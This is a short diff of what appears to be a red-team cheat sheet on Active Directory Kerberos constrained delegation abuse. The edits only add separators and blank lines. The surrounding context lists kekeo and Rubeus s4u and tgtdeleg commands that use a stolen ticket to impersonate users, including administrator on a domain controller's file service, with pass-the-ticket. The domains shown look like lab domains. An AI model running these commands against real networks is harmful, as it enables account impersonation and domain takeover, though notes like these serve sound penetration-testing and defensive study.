@@ -715,12 +715,15 @@ tgs::s4u /tgt:CERT_WE_STOLE.kirbi
 /user:user_we_are_impersonating@ecorp.lab
 /service:ServiceListedIn{msDS-AllowedToDelegateTo}
 ```
+* * * 
 
 Rubeus (can do /ptt here):
 ```Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo}```
 
 again:
+
 https://github.com/GhostPack/Rubeus#tgtdeleg
+
 ```Rubeus.exe tgtdeleg```
 
 ```Rubeus.exe s4u /ticket: /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt```
@@ -739,6 +742,7 @@ This would do all the steps for us!
 
 -https://github.com/GhostPack/Rubeus#s4u
 
+* * *
 
 Inject PTT:
 
